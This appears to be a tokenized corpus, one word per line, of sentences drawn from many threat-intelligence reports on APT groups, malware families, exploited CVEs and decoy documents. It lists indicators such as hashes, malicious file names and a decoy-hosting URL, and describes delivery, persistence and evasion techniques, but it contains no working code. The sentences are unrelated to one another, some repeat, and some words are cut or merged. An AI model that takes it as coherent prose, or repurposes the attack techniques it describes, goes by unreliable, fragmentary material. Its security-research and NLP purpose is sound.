implant
that
surfaced
in
mid-February
2018
.
 
This
alert
's
IOC
files
provide
HIDDEN
COBRA
indicators
related
to
FALLCHILL
.
 
The
McAfee
Advanced
Threat
Research
team
discovered
a
previously
unknown
data-gathering
implant
that
surfaced
in
mid-February
2018
.
 
Documents
with
the
flash
exploit
managed
to
evade
static
defenses
and
remain
undetected
as
an
exploit
on
VirusTotal
.
 
This
malware
report
contains
analysis
of
one
32-bit
Windows
executable
file
,
identified
as
a
Remote
Access
Trojan
(
RAT
)
.
 
In
one
of
the
samples
received
for
analysis
,
the
US-CERT
Code
Analysis
Team
observed
botnet
controller
functionality
.
 
Volgmer
payloads
have
been
observed
in
32-bit
form
as
either
executables
or
dynamic-link
library
(
.dll
)
Trend
Micro
endpoint
solutions
such
as
Trend
Micro
Smart
Protection
Suites
and
Worry-Free
Business
Security
can
protect
users
and
businesses
from
these
threats
by
detecting
malicious
files
and
spammed
messages
as
well
as
blocking
all
related
malicious
URLs
.
 
WannaCry
appends
encrypted
data
files
with
the
.WCRY
extension
,
drops
and
executes
a
decryptor
tool
,
and
demands
$300
or
$600
USD
(
via
Bitcoin
)
to
decrypt
the
data
.
 
Some
of
the
documents
exploited
CVE-2017-0199
to
deliver
the
payload
.
 
The
Leviathan
also
occasionally
used
macro-laden
Microsoft
Word
documents
to
target
other
US
research
and
development
organizations
during
this
period
.
 
The
download
name
was
"
Zawgyi_Keyboard_L.zip
"
,
and
it
dropped
a
"
setup.exe
"
that
contained
several
backdoor
components
,
including
an
Elise
"
wincex.dll
"
(
a42c966e26f3577534d03248551232f3
,
detected
as
Backdoor.Win32.Agent.delp
)
.
 
Both
attachments
are
malicious
Word
documents
that
attempt
to
exploit
the
Windows
OLE
Automation
Array
Remote
Code
Execution
Vulnerability
tracked
by
CVE-2014-6332
.
 
To
set
up
persistence
,
the
loader
writes
a
file
to
"
c:\temp\rr.exe
"
and
executes
it
with
specific
command
line
arguments
to
create
auto
run
registry
keys
.
 
The
Magic
Hound
campaign
was
also
discovered
using
a
custom
dropper
tool
,
which
we
have
named
MagicHound.DropIt
.
 
For
example
,
we
analyzed
a
DropIt
sample
(
SHA256
:
cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671
)
that
dropped
two
executables
,
one
of
which
was
saved
to
"
%TEMP%\flash_update.exe
"
that
was
a
legitimate
Flash
Player
installer
.
 
During
a
recent
campaign
,
APT32
leveraged
social
engineering
emails
with
Microsoft
ActiveMime
file
attachments
to
deliver
malicious
macros
.
 
The
HTA
files
contained
job
descriptions
and
links
to
job
postings
on
popular
employment
websites
.
 
These
emails
included
recruitment-themed
lures
and
links
to
malicious
HTML
Application
(
HTA
)
files
.
 
POWRUNER
was
delivered
using
a
malicious
RTF
file
that
exploited
CVE-2017-0199
.
 
ChopShop1
is
a
new
framework
developed
by
the
MITRE
Corporation
for
network-based
protocol
decoders
that
enable
security
professionals
to
understand
actual
commands
issued
by
human
operators
controlling
endpoints
.
 
Attachments
are
typically
sent
as
an
executable
file
embedded
in
a
ZIP
archive
or
a
password-protected
Microsoft
Office
document
.
 
This
blog
post
analyzes
several
recent
Molerats
attacks
that
deployed
PIVY
against
targets
in
the
Middle
East
and
in
the
U.S.
We
also
examine
additional
PIVY
attacks
that
leverage
Arabic-language
content
related
to
the
ongoing
crisis
in
Egypt
and
the
wider
Middle
East
to
lure
targets
into
opening
malicious
files
.
 
The
archive
contains
an
.exe
file
,
sometimes
disguised
as
a
Microsoft
Word
file
,
a
video
,
or
another
file
format
,
using
the
corresponding
icon
.
 
The
Palo
Alto
Networks
Unit
42
research
team
recently
came
across
a
series
of
malicious
files
which
were
almost
identical
to
those
targeting
the
Saudi
Arabian
government
previously
discussed
by
MalwareBytes
.
 
We
found
new
variants
of
the
Powermud
backdoor
,
a
new
backdoor
(
Backdoor.Powemuddy
)
,
and
custom
tools
for
stealing
passwords
,
creating
reverse
shells
,
privilege
escalation
,
and
the
use
of
the
native
Windows
cabinet
creation
tool
,
makecab.exe
,
probably
for
compressing
stolen
data
to
be
uploaded
.
 
Analysts
in
our
DeepSight
Managed
Adversary
and
Threat
Intelligence
(
MATI
)
team
have
found
a
new
backdoor
,
Backdoor.Powemuddy
,
new
variants
of
Seedworm
's
Powermud
backdoor
(
aka
POWERSTATS
)
,
a
GitHub
repository
used
by
the
group
to
store
their
scripts
,
as
well
as
several
post-compromise
tools
the
group
uses
to
exploit
victims
once
they
have
established
a
foothold
in
their
network
.
 
Like
the
previous
campaigns
,
these
samples
again
involve
a
Microsoft
Word
document
embedded
with
a
malicious
macro
that
is
capable
of
executing
PowerShell
(
PS
)
scripts
leading
to
a
backdoor
payload
.
 
In
May
2018
,
Trend
Micro
found
a
new
sample
(
Detected
as
W2KM_DLOADR.UHAOEEN
)
that
may
be
related
to
this
campaign
.
 
In
May
2018
,
Trend
Micro
found
a
new
sample
(
Detected
as
W2KM_DLOADR.UHAOEEN
)
that
may
be
related
to
this
campaign
.
 
This
bait
document
,
or
email
attachment
,
appears
to
be
a
standard
Word
document
,
but
is
in
fact
an
CVE-2012-0158
exploit
,
an
executable
with
a
double
extension
,
or
an
executable
with
an
RTLO
filename
,
so
it
can
execute
code
without
the
user
's
knowledge
or
consent
.
 
Taking
a
step
back
,
as
discussed
in
the
Appendix
in
our
initial
OilRig
blog
,
Clayslide
delivery
documents
initially
open
with
a
worksheet
named
"
Incompatible
"
that
displays
content
that
instructs
the
user
to
"
Enable
Content
"
to
see
the
contents
of
the
document
,
which
in
fact
runs
the
malicious
macro
and
compromises
the
system
.
 
The
backdoor
was
delivered
via
a
malicious
.rtf
file
that
exploited
CVE-2017-0199
.
 
The
vulnerability
exists
in
the
old
Equation
Editor
(
EQNEDT32.EXE
)
,
a
component
of
Microsoft
Office
that
is
used
to
insert
and
evaluate
mathematical
formulas
.
 
The
January
8
attack
used
a
variant
of
the
ThreeDollars
delivery
document
,
which
we
identified
as
part
of
the
OilRig
toolset
based
on
attacks
that
occurred
in
August
2017
.
 
The
email
contained
an
attachment
named
Seminar-Invitation.doc
,
which
is
a
malicious
Microsoft
Word
document
we
track
as
ThreeDollars
.
 
We
also
identified
another
sample
of
ThreeDollars
,
created
on
January
15
,
2017
with
the
file
name
strategy
preparation.dot
.
 
We
had
previously
observed
this
author
name
in
use
once
before
,
in
the
very
first
ThreeDollars
document
we
collected
that
we
had
reported
on
in
August
2017
.
 
The
June
2017
sample
of
Clayslide
contained
the
same
OfficeServicesStatus.vbs
file
found
in
the
ISMAgent
Clayslide
document
,
but
instead
of
having
the
payload
embedded
in
the
macro
as
segregated
base64
strings
that
would
be
concatenated
,
this
variant
obtained
its
payload
from
multiple
cells
within
the
"
Incompatible
"
worksheet
.
 
During
this
testing
,
we
saw
document
filenames
that
contain
the
C2
we
witnessed
in
the
targeted
attack
above
,
specifically
the
filenames
XLS-withyourface.xls
and
XLS-withyourface
test.xls
.
 
These
samples
appeared
to
have
been
created
by
OilRig
during
their
development
and
testing
activities
,
all
of
which
share
many
similarities
with
the
delivery
document
used
in
the
recent
OilRig
attack
against
a
Middle
Eastern
government
,
N56.15.doc
(
7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00
)
that
we
have
also
included
in
Table
1
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
In
the
first
week
of
May
2016
,
FireEye
's
DTI
identified
a
wave
of
emails
containing
malicious
attachments
being
sent
to
multiple
banks
in
the
Middle
East
region
.
 
Their
next
move
was
to
list
any
remote
shared
drives
and
then
attempt
to
access
remote
shares
owned
by
the
specific
government
office
they
were
targeting
,
again
attempting
to
extract
all
Word
documents
.
 
For
example
,
in
September
2016
,
Sowbug
infiltrated
an
organization
in
Asia
,
deploying
the
Felismus
backdoor
on
one
of
its
computers
,
Computer
A
,
using
the
file
name
adobecms.exe
in
CSIDL_WINDOWS\debug
.
 
Symantec
has
found
evidence
of
Starloader
files
being
named
AdobeUpdate.exe
,
AcrobatUpdate.exe
,
and
INTELUPDATE.EXE
among
others
.
 
The
attackers
then
began
to
perform
reconnaissance
activities
on
Computer
A
via
cmd.exe
,
collecting
system-related
information
,
such
as
the
OS
version
,
hardware
configuration
,
and
network
information
.
 
In
September
2015
,
Kaspersky
Lab
's
Anti-Targeted
Attack
Platform
discovered
anomalous
network
traffic
in
a
government
organization
network
.
 
Symantec
detects
this
threat
as
Backdoor.Nidiran
.
 
Attackers
have
been
known
to
distribute
malicious
files
masquerading
as
the
legitimate
iviewers.dll
file
and
then
use
DLL
load
hijacking
to
execute
the
malicious
code
and
infect
the
computer
.
 
Once
exploit
has
been
achieved
,
Nidiran
is
delivered
through
a
self-extracting
executable
that
extracts
the
components
to
a
.tmp
folder
after
it
has
been
executed
.
 
While
there
have
been
several
Suckfly
campaigns
that
infected
organizations
with
the
group
's
custom
malware
Backdoor.Nidiran
,
the
Indian
targets
show
a
greater
amount
of
post-infection
activity
than
targets
in
other
regions
.
 
While
there
have
been
several
Suckfly
campaigns
that
infected
organizations
with
the
group
's
custom
malware
Backdoor.Nidiran
,
the
Indian
targets
show
a
greater
amount
of
post-infection
activity
than
targets
in
other
regions
.
 
This
time
,
however
,
TA459
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
This
time
,
however
,
attackers
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
Data
from
the
early
part
of
this
year
shows
that
the
Taidoor
attackers
rampantly
used
malicious.DOC
files
to
exploit
a
Microsoft
Common
Controls
vulnerability
,
CVE-2012-0158
.
 
To
better
understand
how
the
adversary
was
operating
and
what
other
actions
they
had
performed
,
CTU
researchers
examined
cmd.exe
and
its
supporting
processes
to
uncover
additional
command
line
artifacts
.
 
In
a
separate
incident
,
CTU
researchers
identified
a
file
named
s.txt
,
which
is
consistent
with
the
output
of
the
Netview
host-enumeration
tool
.
 
Thrip
was
attempting
to
remotely
install
a
previously
unknown
piece
of
malware
(
Infostealer.Catchamas
)
on
computers
within
the
victim
's
network
.
 
Catchamas
is
a
custom
Trojan
designed
to
steal
information
from
an
infected
computer
and
contains
additional
features
designed
to
avoid
detection
.
 
The
malicious
loader
will
use
dynamic-link
library
(
DLL
)
hijacking
injecting
malicious
code
into
a
process
of
a
file/application
on
sidebar.exe
and
launch
dllhost.exe
(
a
normal
file
)
.
 
As
we
have
noted
in
many
earlier
reports
,
attackers
commonly
use
decoy
files
to
trick
victims
into
thinking
a
malicious
document
is
actually
legitimate
.
 
The
documents
attached
to
spear-phishing
e-mails
used
in
both
attacks
contain
code
that
exploits
CVE-2012-0158
,
which
despite
its
age
remains
one
of
the
most
common
Microsoft
Word
vulnerabilities
being
exploited
by
multiple
threat
actors
.
 
Even
an
experienced
user
can
be
fooled
by
downloading
a
malicious
file
that
is
apparently
from
adobe.com
,
since
the
URL
and
the
IP
address
correspond
to
Adobe
's
legitimate
infrastructure
.
 
According
to
Deepen
,
APT6
has
been
using
spear
phishing
in
tandem
with
malicious
PDF
and
ZIP
attachments
or
links
to
malware
infected
websites
that
contains
a
malicious
SCR
file
.
 
Bellingcat
also
reported
the
domain
had
been
used
previously
to
host
potential
decoy
documents
as
detailed
in
VirusTotal
here
using
http://voguextra.com/decoy.doc
.
 
We
identified
an
overlap
in
the
domain
voguextra.com
,
which
was
used
by
Bahamut
within
their
"
Devoted
To
Humanity
"
app
to
host
an
image
file
and
as
C2
server
by
the
PrayTime
iOS
app
mentioned
in
our
first
post
.
 
While
not
detected
at
the
time
,
Microsoft
's
antivirus
and
security
products
now
detect
this
Barium
malicious
file
and
flag
the
file
as
"
Win32/ShadowPad.A
"
.
 
MXI
Player
appears
to
be
a
version
of
the
Bahamut
agent
,
designed
to
record
the
phone
calls
and
collect
other
information
about
the
user
(
com.mxi.videoplay
)
.
 
Like
PLEAD
,
Shrouded
Crossbow
uses
spear-phishing
emails
with
backdoor-laden
attachments
that
utilize
the
RTLO
technique
and
accompanied
by
decoy
documents
.
 
The
self-extracting
RAR
writes
a
legitimate
executable
,
an
actor-created
DLL
called
Loader.dll
and
a
file
named
readme.txt
to
the
filesystem
and
then
executes
the
legitimate
executable
.
 
Leader
is
Bookworm
's
main
module
and
controls
all
of
the
activities
of
the
Trojan
,
but
relies
on
the
additional
DLLs
to
provide
specific
functionality
.
 
We
speculate
that
other
attacks
delivering
Bookworm
were
also
targeting
organizations
in
Thailand
based
on
the
contents
of
the
associated
decoys
documents
,
as
well
as
several
of
the
dynamic
DNS
domain
names
used
to
host
C2
servers
that
contain
the
words
"
Thai
"
or
"
Thailand
"
.
 
Threat
actors
may
use
the
date
string
hardcoded
into
each
Bookworm
sample
as
a
build
identifier
.
 
Due
to
these
changes
without
a
new
date
string
,
we
believe
the
date
codes
are
used
for
campaign
tracking
rather
than
a
Bookworm
build
identifier
.
 
Another
decoy
slideshow
associated
with
the
Bookworm
attack
campaign
contains
photos
of
an
event
called
Bike
for
Dad
2015
.
 
If
the
document
was
delivered
with
macros
instead
of
exploits
(
CVE-2012-0158
,
CVE-2013-3906
or
CVE-2014-1761
)
,
then
the
document
contained
instructions
for
enabling
macros
.
 
The
executable
would
install
the
real
Ammyy
product
,
but
would
also
launch
a
file
called
either
AmmyyService.exe
or
AmmyySvc.exe
which
contained
the
malicious
payload
.
 
The
second
,
aptly
titled
"
kontrakt87.doc
"
,
copies
a
generic
telecommunications
service
contract
from
MegaFon
,
a
large
Russian
mobile
phone
operator
.
 
In
addition
to
built-in
functionalities
,
the
operators
of
Careto
can
upload
additional
modules
which
can
perform
any
malicious
task
.
 
Careto
's
Mask
campaign
we
discovered
relies
on
spear-phishing
e-mails
with
links
to
a
malicious
website
.
 
Sometimes
,
the
attackers
use
sub-domains
on
the
exploit
websites
,
to
make
them
seem
more
legitimate
.
 
We
initially
became
aware
of
Careto
when
we
observed
attempts
to
exploit
a
vulnerability
in
our
products
to
make
the
malware
"
invisible
"
in
the
system
.
 
The
scanner
was
identified
as
the
Acunetix
Web
Vulnerability
Scanner
which
is
a
commercial
penetration
testing
tool
that
is
readily
available
as
a
14-day
trial
.
 
The
decoy
documents
dropped
suggest
that
the
targets
are
likely
to
be
politically
or
militarily
motivated
,
with
subjects
such
as
Intelligence
reports
and
political
situations
being
used
as
lure
documents
.
 
Lately
,
Patchwork
has
been
sending
multiple
RTF
files
exploiting
CVE-2017-8570
.
 
The
first
of
which
we
call
'
CONFUCIUS_A
'
,
a
malware
family
that
has
links
to
a
series
of
attacks
associated
with
a
backdoor
attack
method
commonly
known
as
SNEEPY
(
aka
ByeByeShell
)
first
reported
by
Rapid7
in
2013
.
 
At
first
glance
CONFUCIUS_B
looks
very
similar
to
CONFUCIUS_A
,
and
they
are
also
packaged
in
plain
SFX
binary
files
.
 
The
CONFUCIUS_B
executable
is
disguised
as
a
PowerPoint
presentation
,
using
a
Right-To-Left-Override
(
RTLO
)
trick
and
a
false
icon
.
 
We
also
believe
that
both
clusters
of
activity
have
links
to
attacks
with
likely
Indian
origins
,
the
CONFUCIUS_A
attacks
are
linked
to
the
use
of
SNEEPY/BYEBYESHELL
and
the
CONFUCIUS_B
have
a
loose
link
to
Hangover
.
 
The
two
malware
families
themselves
are
also
very
similar
,
and
therefore
we
think
that
the
shared
technique
is
an
indication
of
a
single
developer
,
or
development
company
,
behind
both
CONFUCIUS_A
and
CONFUCIUS_B
.
 
The
Android
version
,
for
instance
,
can
steal
SMS
messages
,
accounts
,
contacts
,
and
files
,
as
well
as
record
audio
.
 
The
documents
that
exploit
CVE2017-11882
download
another
payload
an
HTML
Application
(
HTA
)
file
toting
a
malicious
Visual
Basic
(
VBS
)
script
from
the
server
,
which
is
executed
accordingly
by
the
command-line
tool
mshta.exe
.
 
According
to
our
statistics
,
as
of
the
beginning
of
2015
this
botnet
encompassed
over
250
000
infected
devices
worldwide
including
infecting
more
than
100
financial
institutions
with
80%
of
them
from
the
top
20
list
.
 
If
a
bot
was
installed
on
a
network
that
was
of
interest
to
the
hacking
group
,
this
bot
was
then
used
to
upload
one
of
the
remote
access
programs
.
 
At
first
look
,
it
pretends
to
be
a
Java
related
application
but
after
a
quick
analysis
,
it
was
obvious
this
was
something
more
than
just
a
simple
Java
file
.
 
Contextually
relevant
emails
are
sent
to
specific
targets
with
attached
documents
that
are
packed
with
exploit
code
and
Trojan
horse
programmes
designed
to
take
advantage
of
vulnerabilities
in
software
installed
on
the
target
's
computer
.
 
The
authors
of
that
report
identify
three
primary
tools
used
in
the
campaigns
attributed
to
Hidden
Lynx
:
Trojan.Naid
,
Backdoor.Moudoor
,
and
Backdoor.Hikit
.
 
The
above
network
shows
relationships
between
three
tools
used
by
Hidden
Lynx
during
its
VOHO
campaign
:
Trojan.Naid
,
Backdoor.Moudoor
,
and
Backdoor.Hikit
.
 
Symantec
during
2012
linked
the
Elderwood
Project
to
Operation
Aurora
;
Trojan.Naid
and
Backdoor.Moudoor
were
also
used
in
Aurora
,
by
the
Elderwood
Gang
,
and
by
Hidden
Lynx
.
 
One
e-mail
carried
a
Microsoft
PowerPoint
file
named
"
thanks.pps
"
(
VirusTotal
)
,
the
other
a
Microsoft
Word
document
named
"
request.docx
"
.
 
Around
the
same
time
,
WildFire
also
captured
an
e-mail
containing
a
Word
document
(
"
hello.docx
"
)
with
an
identical
hash
as
the
earlier
Word
document
,
this
time
sent
to
a
U.S.
Government
recipient
.
 
The
initially-observed
"
thanks.pps
"
example
tricks
the
user
into
running
the
embedded
file
named
ins8376.exe
which
loads
a
payload
DLL
named
mpro324.dll
.
 
In
this
case
,
the
file
used
the
software
name
"
Cyberlink
"
,
and
a
description
of
"
CLMediaLibrary
Dynamic
Link
Library
"
and
listing
version
4.19.9.98
.
 
This
next
stage
library
copies
itself
into
the
System32
directory
of
the
Windows
folder
after
the
hardcoded
file
name
either
KBDLV2.DLL
or
AUTO.DLL
,
depending
on
the
malware
sample
.
 
Once
BARIUM
has
established
rapport
,
they
spear-phish
the
victim
using
a
variety
of
unsophisticated
malware
installation
vectors
,
including
malicious
shortcut
(
.lnk
)
files
with
hidden
payloads
,
compiled
HTML
help
(
.chm
)
files
,
or
Microsoft
Office
documents
containing
macros
or
exploits
.
 
This
was
the
case
in
two
known
intrusions
in
2015
,
where
attackers
named
the
implant
DLL
"
ASPNET_FILTER.DLL
"
to
disguise
it
as
the
DLL
for
the
ASP.NET
ISAPI
Filter
.
 
In
early
2016
the
Callisto
Group
began
sending
highly
targeted
spear
phishing
emails
with
malicious
attachments
that
contained
,
as
their
final
payload
,
the
"
Scout
"
malware
tool
from
the
HackingTeam
RCS
Galileo
platform
.
 
The
malicious
attachments
purported
to
be
invitations
or
drafts
of
the
agenda
for
the
conference
.
 
We
encountered
the
first
document
exploit
called
"
THAM
luan
-
GD
-
NCKH2.doc
"
a
few
days
ago
,
which
appears
to
be
leveraging
some
vulnerabilities
patched
with
MS12-060
.
 
This
document
,
written
in
Vietnamese
,
appears
to
be
reviewing
and
discussing
best
practices
for
teaching
and
researching
scientific
topics
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
There
is
the
exploit
code
and
malware
used
to
gain
access
to
systems
,
the
infrastructure
that
provides
command
and
control
to
the
malware
operator
,
and
the
human
elements
developers
who
create
the
malware
,
operators
who
deploy
it
,
and
analysts
who
extract
value
from
the
stolen
information
.
 
The
operation
against
the
Tibetan
Parliamentarians
illustrates
the
continued
use
of
malicious
attachments
in
the
form
of
documents
bearing
exploits
.
 
The
first
attack
started
in
early
July
with
a
ShimRatReporter
payload
.
 
In
their
Operation
Tropic
Trooper
report
,
Trend
Micro
documented
the
behaviour
and
functionality
of
an
espionage
toolkit
with
several
design
similarities
to
those
observed
in
the
various
components
of
KeyBoy
.
 
The
exploit
document
carrying
this
alternate
KeyBoy
configuration
also
used
a
decoy
document
which
was
displayed
to
the
user
after
the
exploit
launched
.
 
This
technique
hides
the
true
C2
server
from
researchers
that
do
not
have
access
to
both
the
rastls.dll
and
Sycmentec.config
files
.
 
This
file
requires
the
target
to
attempt
to
open
the
.lnk
file
,
which
redirects
the
user
to
a
Windows
Scripting
Component
(
.wsc
)
file
,
hosted
on
an
adversary-controlled
microblogging
page
.
 
Upon
successful
exploitation
,
the
attachment
will
install
the
Trojan
known
as
NetTraveler
using
a
DLL
side-loading
attack
technique
.
 
Kaspersky
Lab
's
products
detect
the
Microsoft
Office
exploits
used
in
the
spear-phishing
attacks
,
including
Exploit.MSWord.CVE-2010-333
,
Exploit.Win32.CVE-2012-0158
.
 
The
files
exploit
the
well-known
Microsoft
Office
vulnerability
,
CVE-2012-0158
,
to
execute
malicious
code
in
order
to
take
control
of
the
targeted
systems
.
 
We
also
discovered
an
interesting
piece
of
rare
malware
created
by
this
threat
actor
a
Bluetooth
device
harvester
.
 
For
example
,
Bisonal
malware
in
2012
used
send()
and
recv()
APIs
to
communicate
with
its
C2.
This
Bisonal
variant
used
in
the
latest
attack
communicates
with
one
of
the
following
hard-coded
C2
addresses
by
using
the
HTTP
POST
method
on
TCP
PROT
443
.
 
Previous
reports
have
discussed
Bisonal
malware
used
in
attacks
against
Japan
,
South
Korea
and
Russia
.
 
This
particular
sample
we
found
targeted
an
organization
in
Russia
and
there
is
a
specific
system
language
check
for
Cyrillic
and
no
others
.
 
If
it's
Cyrillic
and
the
command
to
the
shell
is
not
ipconfig
,
the
threat
converts
the
command
result
text
encoding
from
Cyrillic
to
UTF-16
.
 
Similar
to
the
Bisonal
variant
targeting
the
Russian
organization
,
this
sample
was
also
disguised
as
PDF
document
.
 
The
contents
of
the
decoy
PDF
is
a
job
descriptions
with
the
South
Korean
Coast
Guard
.
 
The
installed
EXE
file
is
almost
exactly
the
same
as
the
DLL
version
of
Bisonal
variant
used
against
the
Russian
organization
.
 
ined
in
the
archive
is
called
DriverInstallerU.exe
but
its
metadata
shows
that
its
original
name
is
Interenet
Assistant.exe
.
 
In
this
sample
,
however
,
the
module
names
were
changed
from
actors
and
characters
names
to
car
models
,
namely
BMW_x1
,
BMW_x2
and
up
to
BMW_x8
.
 
wuaupdt.exe
is
a
CMD
backdoor
,
which
can
receive
and
execute
CMD
commands
sent
from
C2
.
 
Furthermore
,
it
has
similar
code
logic
as
previous
ones
wuaupdt.exe
in
this
attack
appears
in
previous
Donot
attack
,
and
C2
addresses
are
same
to
previous
ones
.
 
Other
open
source
and
semi-legitimate
pen-testing
tools
like
nbtscan
and
powercat
are
being
used
for
mapping
available
resources
and
lateral
movement
as
well
.
 
As
described
in
the
infection
flow
,
one
of
the
first
uses
of
the
AutoHotKey
scripts
is
to
upload
a
screenshot
from
the
compromised
PC
.
 
Throughout
our
investigation
,
we
have
found
evidence
that
shows
operational
similarities
between
this
implant
and
Gamaredon
Group
.
 
The
techniques
and
modules
employed
by
EvilGnome
that
is
the
use
of
SFX
,
persistence
with
task
scheduler
and
the
deployment
of
information
stealing
toolsremind
us
of
Gamaredon
Groups
Windows
tools
.
 
We
can
observe
that
the
sample
is
very
recent
,
created
on
Thursday
,
July
4
As
can
be
observed
in
the
illustration
above
,
the
makeself
script
is
instructed
to
run
./setup.sh
after
unpacking
.
 
The
ShooterAudio
module
uses
PulseAudio
to
capture
audio
from
the
user's
microphone
.
 
makeself.sh
is
a
small
shell
script
that
generates
a
self-extractable
compressed
tar
archive
from
a
directory
.
 
The
RAT
,
however
,
had
a
multitude
of
functionalities
(as
listed
in
the
table
below)
such
as
to
download
and
execute
,
compress
,
encrypt
,
upload
,
search
directories
,
etc
.
 
In
a
more
recent
version
of
the
modified
Gh0st
RAT
malware
,
Ghost
Dragon
implemented
dynamic
packet
flags
which
change
the
first
five
bytes
of
the
header
in
every
login
request
with
the
controller
.
 
One
hour
later
,
Bemstour
was
used
against
an
educational
institution
in
Belgium
.
 
Bemstour
is
specifically
designed
to
deliver
a
variant
of
the
DoublePulsar
backdoor
.
 
DoublePulsar
is
then
used
to
inject
a
secondary
payload
,
which
runs
in
memory
only
.
 
A
significantly
improved
variant
of
the
Bemstour
exploit
tool
was
rolled
out
in
September
2016
,
when
it
was
used
in
an
attack
against
an
educational
institution
in
Hong
Kong
.
 
Bemstour
was
used
again
in
June
2017
in
an
attack
against
an
organization
in
Luxembourg
.
 
Between
June
and
September
2017
,
Bemstour
was
also
used
against
targets
in
the
Philippines
and
Vietnam
.
 
Development
of
Bemstour
has
continued
into
2019
.
 
Unlike
earlier
attacks
when
Bemstour
was
delivered
using
Buckeye's
Pirpi
backdoor
,
in
this
attack
Bemstour
was
delivered
to
the
victim
by
a
different
backdoor
Trojan
(
Backdoor.Filensfer
)
.
 
The
most
recent
sample
of
Bemstour
seen
by
Symantec
appears
to
have
been
compiled
on
March
23
,
2019
,
eleven
days
after
the
zero-day
vulnerability
was
patched
by
Microsoft
.
 
Filensfer
is
a
family
of
malware
that
has
been
used
in
targeted
attacks
since
at
least
2013
.
 
While
Symantec
has
never
observed
the
use
of
Filensfer
alongside
any
known
Buckeye
tools
,
information
shared
privately
by
another
vendor
included
evidence
of
Filensfer
being
used
in
conjunction
with
known
Buckeye
malware
(Backdoor.Pirpi)
.
 
CVE-2017-0143
was
also
used
by
two
other
exploit
toolsEternalRomance
and
EternalSynergythat
were
released
as
part
of
the
Shadow
Brokers
leak
in
April
2017
.
 
Buckeye's
exploit
tool
,
EternalRomance
,
as
well
as
EternalSynergy
,
can
exploit
the
CVE-2017-0143
message
type
confusion
vulnerability
to
perform
memory
corruption
on
unpatched
victim
computers
.
 
this
RTF
exploits
again
the
CVE-2017-1882
on
eqnedt32.exe
.
 
And
the
dropper
execute
the
iassvcs.exe
to
make
a
side
loading
and
make
the
persistence
.
 
Over
the
past
three
years
,
Filensfer
has
been
deployed
against
organizations
in
Luxembourg
,
Sweden
,
Italy
,
the
UK
,
and
the
U.S
.
 
Our
analysis
of
this
malware
shows
that
it
belongs
to
Hussarini
,
also
known
as
Sarhust
,
a
backdoor
family
that
has
been
used
actively
in
APT
attacks
targeting
countries
in
the
ASEAN
region
since
2014
.
 
OutExtra.exe
is
a
signed
legitimate
application
from
Microsoft
named
finder.exe
.
 
Today
,
this
malware
is
still
actively
being
used
against
the
Philippines
.
 
Xagent
is
the
original
filename
Xagent.exe
whereas
seems
to
be
the
version
of
the
worm
.
 
Our
technical
analysis
of
the
malware
used
in
these
attacks
showed
close
ties
to
BS2005
backdoors
from
operation
Ke3chang
,
and
to
a
related
TidePool
malware
family
discovered
by
Palo
Alto
Networks
in
2016
that
targeted
Indian
embassies
across
the
globe
.
 
The
malicious
actors
behind
the
Okrum
malware
were
focused
on
the
same
targets
in
Slovakia
that
were
previously
targeted
by
Ketrican
2015
backdoors
.
 
We
started
connecting
the
dots
when
we
discovered
that
the
Okrum
backdoor
was
used
to
drop
a
Ketrican
backdoor
,
freshly
compiled
in
2017
.
 
In
2017
,
the
same
entities
that
were
affected
by
the
Okrum
malware
and
by
the
2015
Ketrican
backdoors
again
became
targets
of
the
malicious
actors
.
 
This
time
,
the
attackers
used
new
versions
of
the
RoyalDNS
malware
and
a
Ketrican
2017
backdoor
.
 
According
to
ESET
telemetry
,
Okrum
was
first
detected
in
December
2016
,
and
targeted
diplomatic
missions
in
Slovakia
,
Belgium
,
Chile
,
Guatemala
and
Brazil
throughout
2017
.
 
According
to
our
telemetry
,
Okrum
was
used
to
target
diplomatic
missions
in
Slovakia
,
Belgium
,
Chile
,
Guatemala
,
and
Brazil
,
with
the
attackers
showing
a
particular
interest
in
Slovakia
.
 
The
detection
evasion
techniques
we
observed
in
the
Okrum
malware
include
embedding
the
malicious
payload
within
a
legitimate
PNG
image
,
employing
several
anti-emulation
and
anti-sandbox
tricks
,
as
well
as
making
frequent
changes
in
implementation
.
 
According
to
ClearSky
,
the
suspected
Lazarus
operatives
looked
to
leverage
a
vulnerability
in
outdated
WinRAR
file-archiving
software
that
hackers
have
been
exploiting
since
it
was
disclosed
last
month
.
 
The
diagram
below
illustrates
how
we
believe
the
actors
behind
the
Sea
Turtle
campaign
used
DNS
hijacking
to
achieve
their
end
goals
.
 
If
the
user
enables
macro
to
open
the
xlsm
file
,
it
will
then
drop
the
legitimate
script
engine
AutoHotkey
along
with
a
malicious
script
file
.
 
Create
a
link
file
in
the
startup
folder
for
AutoHotkeyU32.exe
,
allowing
the
attack
to
persist
even
after
a
system
restart
.
 
Such
attacks
highlight
the
need
for
caution
before
downloading
files
from
unknown
sources
and
enabling
macro
for
files
from
unknown
sources
.
 
Honeycomb
toolserver
receives
exfiltrated
information
from
the
implant;
an
operator
can
also
task
the
implant
to
execute
jobs
on
the
target
computer
,
so
the
toolserver
acts
as
a
C2
(command
and
control)
server
for
the
implant
.
 
UMBRAGE
components
cover
keyloggers
,
password
collection
,
webcam
capture
,
data
destruction
,
persistence
,
privilege
escalation
,
stealth
,
anti-virus
(PSP)
avoidance
and
survey
techniques
.
 
'Improvise'
is
a
toolset
for
configuration
,
post-processing
,
payload
setup
and
execution
vector
selection
for
survey/Exfiltration
tools
supporting
all
major
operating
systems
like
Windows
(
Bartender
)
,
MacOS
(
JukeBox
)
and
Linux
(
DanceFloor
)
.
 
This
sample
,
similar
to
other
Trochilus
samples
,
was
deployed
using
a
DLL
sideloading
method
utilizing
three
files
,
uploaded
to
the
same
folder
on
the
victim
machine
as
identified
in
US-CERT
advisory
TA17-117A
last
